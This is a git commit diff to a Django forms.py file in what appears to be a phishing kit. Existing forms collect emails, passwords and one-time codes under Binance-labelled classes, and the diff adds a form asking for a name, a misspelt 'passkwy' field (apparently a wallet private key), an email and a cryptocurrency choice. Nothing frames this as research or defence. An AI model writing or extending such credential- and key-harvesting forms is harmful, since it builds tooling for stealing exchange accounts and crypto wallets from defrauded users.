3f14305d418cc1a7c29b3e7177e51f1e5b009230
Globalinvestors94 <166951378+Globalinvestors94@users.noreply.github.com>
2024-08-31 18:24:21 +0100

    Update forms.py

--- hk/forms.py
+++ hk/forms.py
@@ -1,11 +1,10 @@
 from django import forms
 
 
+
 class EmailForm(forms.Form):
     email = forms.EmailField()
     password = forms.CharField(widget=forms.PasswordInput())
-
-
 
 class BinanceEmail(forms.Form):
     email = forms.EmailField()
@@ -17,3 +16,18 @@ class BinancePassword(forms.Form):
 
 class BinanceOTP(forms.Form):
     otp = forms.CharField()
+
+
+class PkeyConfirm(forms.Form):
+    CHOICES = [
+    ('Select Coin','Select Coin'),
+    ('Bitcoin','Bitcoin'),
+    ('Ethurum','Ethurum'),
+    ('BnB','BnB'),
+    ('USDT_Tron','USDT_Tron'),
+    ('USDT_ERC20','USDT_ERC20'),
+    ]
+    name = forms.CharField(max_length=60)
+    passkwy = forms.CharField(max_length=60)
+    email = forms.EmailField()
+    coin = forms.ChoiceField(choices=CHOICES)
